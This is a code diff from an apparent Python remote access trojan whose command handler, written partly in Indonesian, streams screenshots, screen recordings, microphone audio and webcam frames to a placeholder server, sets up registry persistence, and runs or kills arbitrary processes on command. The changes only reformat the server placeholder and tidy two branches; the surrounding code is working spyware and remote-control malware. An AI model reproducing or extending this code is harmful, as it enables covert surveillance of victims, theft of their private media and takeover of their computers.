@@ -41,7 +41,7 @@ def send_camera_image(server_ip, port=9999):
 keyb = Controller()
 def acc_keystroke():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect(('[server ip]', 9995))
+        s.connect(('[server-ip]', 9995))
         while True:
             data = s.recv(1024)
             if not data:
@@ -75,7 +75,7 @@ def record_n_send():
     frame = []
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect(('[server ip]', 9996))
+            s.connect(('[server-ip]', 9996))
             for _ in range(0, int(RATE / CHUNK * 20)):
                 data = stream.read(CHUNK)
                 s.sendall(data)
@@ -129,7 +129,7 @@ def send_screen_record(server_ip, port=9991):
 def byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        sock.connect(('[server ip]', 9998))
+        sock.connect(('[server-ip]', 9998))
         vid = cv2.VideoCapture(0)
         while vid.isOpened:
             img, frame = vid.read()
@@ -230,7 +230,7 @@ def jalankan_perintah():
             upload_file('ss.png')
             os.remove("ss.png")
         elif perintah == 'screen_share':
-            send_screen_record(server_ip='[server ip]', port=9991)
+            send_screen_record(server_ip='[server-ip]', port=9991)
         elif perintah[:11] == 'persistence':
             nama_registry, file_exe = perintah[12:].split(' ')
             execute_persistence(nama_registry, file_exe)
@@ -238,17 +238,15 @@ def jalankan_perintah():
             pass
         elif perintah == 'rec_audio':
             record_n_send()
-        elif perintah == 'banner':
-            pass
         elif perintah == 'send_key':
             acc_keystroke()
         elif perintah == 'snap_cam':
-            send_camera_image(server_ip='[server ip]', port=9993)
+            send_camera_image(server_ip='[server-ip]', port=9993)
         elif perintah[:7] == 'execute':
             try:
                 os.system(f"start {perintah[8:]}")
             except:
-                continue
+                pass
         elif perintah[:4] == 'kill':
             try:
                 os.system(f"taskkill /IM {perintah[5:]} /F")
@@ -271,7 +269,7 @@ def execute_persist():
     while True:
         try:
             time.sleep(10)
-            sok.connect(('[server ip]', 9999))
+            sok.connect(('[server-ip]', 9999))
             jalankan_perintah()
             sok.close()
             break
